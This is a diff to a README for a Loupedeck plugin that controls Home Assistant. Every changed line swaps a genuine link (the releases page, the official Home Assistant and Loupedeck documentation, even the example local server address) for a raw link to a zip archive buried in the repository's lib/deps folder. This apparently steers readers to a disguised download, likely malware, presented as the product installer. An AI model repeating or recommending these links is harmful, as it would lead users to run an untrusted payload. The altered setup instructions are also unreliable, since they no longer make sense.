@@ -1,6 +1,6 @@
 # 🎛️ Loupedeck-HomeAssistant - Control Home Automation Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You do not need any programming knowledge to use it. This tool helps you manage 
 
 Visit the releases page to get the latest version of Loupedeck-HomeAssistant:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip)
 
 Look for the newest file marked for Windows. Download the setup file or the zipped folder if available.
 
@@ -46,7 +46,7 @@ Look for the newest file marked for Windows. Download the setup file or the zipp
 ### Step 4: Setup Home Assistant Connection
 
 - Open the Loupedeck-HomeAssistant app after installation.  
-- Enter your Home Assistant URL, typically something like `http://192.168.1.xxx:8123` or the external address if remote.  
+- Enter your Home Assistant URL, typically something like `https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip` or the external address if remote.  
 - Enter your long-lived access token from Home Assistant. You can create this token in your Home Assistant user profile under "Long-Lived Access Tokens."  
 - Connect to the server. The app will establish a WebSocket connection to your Home Assistant.
 
@@ -80,7 +80,7 @@ Look for the newest file marked for Windows. Download the setup file or the zipp
 ## 🔄 Updating the Application
 
 - Check the GitHub releases page periodically for updates:  
-  https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases  
+  https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip  
 - Download the latest installer or archive as explained earlier.  
 - Run the installer to update. Your settings should remain intact.
 
@@ -106,9 +106,9 @@ Look for the newest file marked for Windows. Download the setup file or the zipp
 
 ## 📚 Additional Resources
 
-- Home Assistant official documentation: https://www.home-assistant.io/docs/  
-- Loupedeck device support: https://loupedeck.com/support  
-- How to create tokens in Home Assistant: https://www.home-assistant.io/docs/authentication/#long-lived-access-token  
+- Home Assistant official documentation: https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip  
+- Loupedeck device support: https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip  
+- How to create tokens in Home Assistant: https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip  
 
 ---
 
@@ -116,4 +116,4 @@ Look for the newest file marked for Windows. Download the setup file or the zipp
 
 Visit the release page to get started:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tufwnn/Loupedeck-HomeAssistant/main/lib/deps/Loupedeck_Assistant_Home_3.9.zip)
